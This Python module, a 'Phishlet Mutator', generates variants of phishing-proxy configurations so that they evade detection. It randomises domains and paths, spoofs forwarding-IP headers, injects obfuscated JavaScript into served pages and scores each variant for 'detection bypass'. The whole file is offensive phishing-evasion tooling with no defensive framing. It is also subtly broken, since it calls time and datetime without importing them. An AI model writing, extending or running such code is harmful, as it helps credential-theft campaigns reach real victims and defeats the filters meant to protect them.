"""
Phishlet Mutator - Advanced Mutation Engine
============================================

Mutates phishlets to bypass detection systems:
- Domain and subdomain variation
- Path randomization
- Parameter obfuscation
- Header manipulation
- JavaScript injection
"""

import yaml
import json
import random
import string
import hashlib
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, asdict
from pathlib import Path
import secrets

from .domain_generator import DomainGenerator
from .obfuscator import JavaScriptObfuscator
from .evasion_engine import EvasionEngine


@dataclass
class MutationConfig:
    """Configuration for mutation strategies"""
    domain_variation: bool = True
    path_obfuscation: bool = True
    parameter_randomization: bool = True
    header_manipulation: bool = True
    javascript_injection: bool = True
    timing_variation: bool = True
    user_agent_rotation: bool = True
    content_encoding: bool = True


@dataclass
class MutatedPhishlet:
    """Result of phishlet mutation"""
    original_name: str
    mutated_name: str
    mutation_id: str
    config: Dict[str, Any]
    mutations_applied: List[str]
    detection_bypass_score: float
    operational_risk: str


class PhishletMutator:
    """
    Advanced phishlet mutation engine for evasion.
    Generates multiple variants to bypass detection systems.
    """
    
    def __init__(self, config: Optional[MutationConfig] = None):
        self.config = config or MutationConfig()
        self.domain_gen = DomainGenerator()
        self.obfuscator = JavaScriptObfuscator()
        self.evasion_engine = EvasionEngine()
        
        # Mutation strategies
        self.strategies = {
            'domain_variation': self._mutate_domains,
            'path_obfuscation': self._mutate_paths,
            'parameter_randomization': self._mutate_parameters,
            'header_manipulation': self._mutate_headers,
            'javascript_injection': self._inject_javascript,
            'timing_variation': self._mutate_timing,
            'user_agent_rotation': self._mutate_user_agents,
            'content_encoding': self._mutate_encoding
        }
    
    def mutate_phishlet(self, phishlet_path: str, 
                        num_variants: int = 5) -> List[MutatedPhishlet]:
        """
        Generate multiple mutated variants of a phishlet.
        
        Args:
            phishlet_path: Path to original phishlet
            num_variants: Number of variants to generate
            
        Returns:
            List of mutated phishlets
        """
        # Load original phishlet
        with open(phishlet_path, 'r') as f:
            original_config = yaml.safe_load(f)
        
        original_name = original_config.get('name', 'unknown')
        variants = []
        
        for i in range(num_variants):
            # Create mutation ID
            mutation_id = self._generate_mutation_id(original_name, i)
            
            # Deep copy config for mutation
            mutated_config = json.loads(json.dumps(original_config))
            
            # Apply mutations
            mutations_applied = []
            
            if self.config.domain_variation:
                self._mutate_domains(mutated_config)
                mutations_applied.append('domain_variation')
            
            if self.config.path_obfuscation:
                self._mutate_paths(mutated_config)
                mutations_applied.append('path_obfuscation')
            
            if self.config.parameter_randomization:
                self._mutate_parameters(mutated_config)
                mutations_applied.append('parameter_randomization')
            
            if self.config.header_manipulation:
                self._mutate_headers(mutated_config)
                mutations_applied.append('header_manipulation')
            
            if self.config.javascript_injection:
                self._inject_javascript(mutated_config)
                mutations_applied.append('javascript_injection')
            
            if self.config.timing_variation:
                self._mutate_timing(mutated_config)
                mutations_applied.append('timing_variation')
            
            if self.config.user_agent_rotation:
                self._mutate_user_agents(mutated_config)
                mutations_applied.append('user_agent_rotation')
            
            if self.config.content_encoding:
                self._mutate_encoding(mutated_config)
                mutations_applied.append('content_encoding')
            
            # Calculate bypass score
            bypass_score = self._calculate_bypass_score(mutations_applied)
            
            # Assess operational risk
            risk = self._assess_operational_risk(mutated_config, mutations_applied)
            
            # Create mutated phishlet
            mutated_phishlet = MutatedPhishlet(
                original_name=original_name,
                mutated_name=f"{original_name}_mutated_{i}",
                mutation_id=mutation_id,
                config=mutated_config,
                mutations_applied=mutations_applied,
                detection_bypass_score=bypass_score,
                operational_risk=risk
            )
            
            variants.append(mutated_phishlet)
        
        return variants
    
    def _generate_mutation_id(self, base_name: str, variant: int) -> str:
        """Generate unique mutation ID"""
        timestamp = str(int(time.time()))
        random_str = secrets.token_hex(4)
        return hashlib.sha256(f"{base_name}{variant}{timestamp}{random_str}".encode()).hexdigest()[:16]
    
    def _mutate_domains(self, config: Dict[str, Any]) -> None:
        """Mutate domains and subdomains"""
        # Generate domain variations
        if 'author' in config and 'domain' in config['author']:
            original_domain = config['author']['domain']
            variations = self.domain_gen.generate_variations(original_domain, count=3)
            config['author']['domain'] = random.choice(variations)
        
        # Mutate subdomains
        for subdomain in config.get('subdomains', []):
            if 'subdomain' in subdomain:
                original_sub = subdomain['subdomain']
                variations = self.domain_gen.generate_subdomain_variations(original_sub, count=2)
                subdomain['subdomain'] = random.choice(variations)
    
    def _mutate_paths(self, config: Dict[str, Any]) -> None:
        """Obfuscate and randomize paths"""
        for rule in config.get('redirect_rules', []):
            if 'path' in rule:
                original_path = rule['path']
                
                # Add random parameters
                if '?' not in original_path:
                    random_param = secrets.token_hex(4)
                    rule['path'] = f"{original_path}?{random_param}={secrets.token_hex(6)}"
                else:
                    # Add additional parameter
                    random_param = secrets.token_hex(4)
                    rule['path'] = f"{original_path}&{random_param}={secrets.token_hex(6)}"
                
                # Path obfuscation
                if random.random() < 0.3:  # 30% chance
                    # Insert random path segments
                    segments = original_path.split('/')
                    if len(segments) > 2:
                        insert_pos = random.randint(1, len(segments) - 1)
                        random_segment = secrets.token_hex(3)
                        segments.insert(insert_pos, random_segment)
                        rule['path'] = '/'.join(segments)
    
    def _mutate_parameters(self, config: Dict[str, Any]) -> None:
        """Randomize parameter names and values"""
        for rule in config.get('redirect_rules', []):
            if 'params' in rule:
                # Randomize parameter values
                for param, value in rule['params'].items():
                    if isinstance(value, str) and len(value) > 3:
                        # Keep first and last character, randomize middle
                        if len(value) > 5:
                            new_value = value[0] + secrets.token_hex(len(value) - 2) + value[-1]
                            rule['params'][param] = new_value
            
            # Add fake parameters
            if random.random() < 0.4:  # 40% chance
                if 'params' not in rule:
                    rule['params'] = {}
                
                fake_param = f"_{secrets.token_hex(3)}"
                fake_value = secrets.token_hex(8)
                rule['params'][fake_param] = fake_value
    
    def _mutate_headers(self, config: Dict[str, Any]) -> None:
        """Manipulate HTTP headers"""
        for rule in config.get('redirect_rules', []):
            if 'headers' not in rule:
                rule['headers'] = {}
            
            # Add random headers
            common_headers = [
                ('X-Requested-With', 'XMLHttpRequest'),
                ('X-Forwarded-For', f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"),
                ('X-Real-IP', f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"),
                ('User-Agent', self._get_random_user_agent()),
                ('Accept-Language', f"en-US,en;q={random.random():.1f}"),
                ('Cache-Control', random.choice(['no-cache', 'max-age=0', 'no-store'])),
            ]
            
            # Add 1-3 random headers
            num_headers = random.randint(1, 3)
            selected_headers = random.sample(common_headers, num_headers)
            
            for header_name, header_value in selected_headers:
                rule['headers'][header_name] = header_value
    
    def _inject_javascript(self, config: Dict[str, Any]) -> None:
        """Inject obfuscated JavaScript"""
        for rule in config.get('redirect_rules', []):
            if 'content_type' in rule and 'html' in rule['content_type'].lower():
                # Generate obfuscated JavaScript
                js_code = self.obfuscator.generate_evasion_script()
                
                # Add to response body if present
                if 'body' not in rule:
                    rule['body'] = ""
                
                # Inject script tag
                script_tag = f"<script>{js_code}</script>"
                rule['body'] += script_tag
    
    def _mutate_timing(self, config: Dict[str, Any]) -> None:
        """Add timing variations"""
        for rule in config.get('redirect_rules', []):
            # Add random delays
            if random.random() < 0.3:  # 30% chance
                delay = random.uniform(0.1, 2.0)
                rule['delay'] = round(delay, 2)
            
            # Add timeout variations
            if random.random() < 0.2:  # 20% chance
                timeout = random.randint(5, 30)
                rule['timeout'] = timeout
    
    def _mutate_user_agents(self, config: Dict[str, Any]) -> None:
        """Rotate user agents"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)",
            "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"
        ]
        
        for rule in config.get('redirect_rules', []):
            if 'headers' not in rule:
                rule['headers'] = {}
            
            rule['headers']['User-Agent'] = random.choice(user_agents)
    
    def _mutate_encoding(self, config: Dict[str, Any]) -> None:
        """Mutate content encoding"""
        encodings = ['gzip', 'deflate', 'br']
        
        for rule in config.get('redirect_rules', []):
            if random.random() < 0.4:  # 40% chance
                encoding = random.choice(encodings)
                rule['headers'] = rule.get('headers', {})
                rule['headers']['Accept-Encoding'] = encoding
                rule['headers']['Content-Encoding'] = encoding
    
    def _get_random_user_agent(self) -> str:
        """Get random user agent string"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)",
            "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"
        ]
        return random.choice(user_agents)
    
    def _calculate_bypass_score(self, mutations_applied: List[str]) -> float:
        """Calculate detection bypass score"""
        base_score = 0.0
        
        # Score for each mutation type
        mutation_scores = {
            'domain_variation': 0.3,
            'path_obfuscation': 0.2,
            'parameter_randomization': 0.15,
            'header_manipulation': 0.1,
            'javascript_injection': 0.25,
            'timing_variation': 0.05,
            'user_agent_rotation': 0.1,
            'content_encoding': 0.1
        }
        
        for mutation in mutations_applied:
            base_score += mutation_scores.get(mutation, 0.0)
        
        # Add synergy bonus for multiple mutations
        synergy_bonus = min(len(mutations_applied) * 0.05, 0.3)
        
        total_score = min(base_score + synergy_bonus, 1.0)
        return round(total_score, 3)
    
    def _assess_operational_risk(self, config: Dict[str, Any], 
                               mutations_applied: List[str]) -> str:
        """Assess operational risk of mutated phishlet"""
        risk_score = 0
        
        # Risk factors
        if 'javascript_injection' in mutations_applied:
            risk_score += 2  # High risk -容易被检测
        
        if 'domain_variation' in mutations_applied:
            risk_score += 1  # Medium risk - 可能影响功能
        
        if len(mutations_applied) > 4:
            risk_score += 1  # Higher complexity = higher risk
        
        # Check for potentially breaking mutations
        for rule in config.get('redirect_rules', []):
            if 'path' in rule and len(rule['path']) > 200:
                risk_score += 1  # Path too long
        
        if risk_score >= 3:
            return 'high'
        elif risk_score >= 2:
            return 'medium'
        else:
            return 'low'
    
    def save_mutated_phishlet(self, mutated: MutatedPhishlet, 
                            output_dir: str) -> str:
        """Save mutated phishlet to file"""
        output_path = Path(output_dir)
        output_path.mkdir(exist_ok=True)
        
        filename = f"{mutated.mutated_name}.yaml"
        file_path = output_path / filename
        
        # Save mutated config
        with open(file_path, 'w') as f:
            yaml.dump(mutated.config, f, default_flow_style=False)
        
        # Save mutation metadata
        metadata = {
            'mutation_id': mutated.mutation_id,
            'original_name': mutated.original_name,
            'mutations_applied': mutated.mutations_applied,
            'bypass_score': mutated.detection_bypass_score,
            'operational_risk': mutated.operational_risk,
            'created_at': datetime.now().isoformat()
        }
        
        metadata_path = output_path / f"{mutated.mutated_name}_metadata.json"
        with open(metadata_path, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        return str(file_path)
    
    def batch_mutate(self, phishlet_dir: str, output_dir: str, 
                    variants_per_phishlet: int = 3) -> Dict[str, List[str]]:
        """Batch mutate all phishlets in directory"""
        results = {}
        
        phishlet_files = list(Path(phishlet_dir).glob("*.yaml"))
        
        for phishlet_file in phishlet_files:
            try:
                variants = self.mutate_phishlet(
                    str(phishlet_file), 
                    num_variants=variants_per_phishlet
                )
                
                saved_files = []
                for variant in variants:
                    saved_path = self.save_mutated_phishlet(variant, output_dir)
                    saved_files.append(saved_path)
                
                results[phishlet_file.name] = saved_files
                
            except Exception as e:
                print(f"Failed to mutate {phishlet_file}: {e}")
                results[phishlet_file.name] = []
        
        return results
